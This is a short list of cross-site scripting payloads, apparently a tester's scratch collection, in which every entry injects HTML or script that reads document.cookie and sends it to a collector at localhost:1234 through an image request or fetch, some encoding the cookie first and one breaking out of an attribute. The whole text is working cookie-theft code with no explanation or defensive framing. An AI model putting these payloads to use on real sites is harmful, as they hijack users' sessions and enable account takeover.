<img src="localhost:1234?c='+document.cookie+'" />'

<script>new Image().src="localhost:1234/?c="+document.cookie;</script>

#"><img src="localhost:1234/?c="+document.cookie; onerror=console.log('test')>


<script>
  fetch('http://localhost:1234', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>



<script>
  const encoded = btoa(document.cookie);

  fetch("http://localhost:1234/collect?value=" + encoded, {
    method: "GET",
    mode: "no-cors"
  });
</script>

<script>
  const data = document.cookie;

  fetch("http://localhost:1234/collect?value=" + encodeURIComponent(data), {
    method: "GET",
    mode: "no-cors"
  });
</script>
